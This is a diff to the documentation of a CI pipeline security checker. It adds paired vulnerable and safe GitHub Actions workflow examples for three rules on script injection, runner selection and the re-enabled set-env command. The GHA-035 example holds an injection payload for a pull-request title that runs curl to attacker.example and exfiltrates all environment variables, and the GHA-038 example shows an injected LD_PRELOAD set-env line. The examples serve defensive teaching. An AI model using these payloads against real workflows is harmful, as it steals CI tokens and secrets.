@@ -1016,6 +1016,39 @@ jobs:
 
 - Scripts that interpolate ``${{ steps.*.outputs.* }}`` from a trusted upstream step are out of scope (the rule only matches the curated untrusted-context regex). If you intentionally rely on a non-curated context, suppress with a brief ``.pipelinecheckignore`` rationale.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR title containing
+#   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
+# closes the surrounding string, runs Node code against the
+# workflow's GITHUB_TOKEN, and exfiltrates every env var.
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@<sha>
+        with:
+          script: |
+            const title = `${{ github.event.pull_request.title }}`;
+            await github.rest.issues.createComment({ body: title });
+
+# Safe: route the value through env so Node sees it as a
+# string, never as JavaScript source.
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@<sha>
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        with:
+          script: |
+            await github.rest.issues.createComment({
+              body: process.env.PR_TITLE,
+            });
+```
+
 **Source:** [`GHA-035`](../providers/github.md#gha-035) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-036`: runs-on interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-036 }
@@ -1031,6 +1064,37 @@ jobs:
 **Known false positives.**
 
 - Workflows that intentionally select runners by environment via a vetted matrix (``runs-on: ${{ matrix.os }}`` where ``matrix.os`` is a hard-coded list inside the workflow) are out of scope, the matrix values are author-controlled, not caller-controlled. The rule only matches the catalog of untrusted contexts (``inputs.*``, ``github.event.*``, ``github.head_ref``, …); ``matrix.*`` and ``env.*`` references are intentionally not flagged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: workflow_dispatch input picks the runner. A
+# caller who can dispatch the workflow picks ``prod-deploy``
+# (or any other privileged self-hosted label the org owns)
+# and the job runs with that fleet's inherited identity.
+on:
+  workflow_dispatch:
+    inputs:
+      runner:
+        type: string
+        required: true
+jobs:
+  run:
+    runs-on: ${{ inputs.runner }}
+    steps:
+      - run: ./scripts/build
+
+# Safe: pin to a hard-coded label. If the choice really has
+# to be parameterised, validate the input against an
+# allowlist at job-level via a small if: guard before any
+# step runs.
+on: { workflow_dispatch: {} }
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./scripts/build
+```
 
 **Source:** [`GHA-036`](../providers/github.md#gha-036) in the [GitHub Actions provider](../providers/github.md).
 
@@ -1065,6 +1129,38 @@ Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::
 **Known false positives.**
 
 - Some legacy actions (last-updated pre-2020) still emit ``::set-env::`` lines and rely on the override to be set. Replace the action rather than suppressing this rule, the security exposure outweighs the cost of an alternative action.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the workflow re-enables the retired command
+# channel. Any tool output containing ``::set-env::`` (a
+# build log, a downloaded artifact, an upstream test runner)
+# now injects environment variables into subsequent steps.
+# A printed line
+#   ::set-env name=LD_PRELOAD::/tmp/x.so
+# from a compromised transitive dep silently rewires the
+# linker on the next ``run:`` step.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: ./scripts/build
+
+# Safe: don't set the override; use the file-redirect form
+# for any env / PATH mutation the workflow legitimately needs.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          echo "BUILD_TAG=$(git rev-parse --short HEAD)" >> "$GITHUB_ENV"
+      - run: ./scripts/build
+```
 
 **Source:** [`GHA-038`](../providers/github.md#gha-038) in the [GitHub Actions provider](../providers/github.md).
 
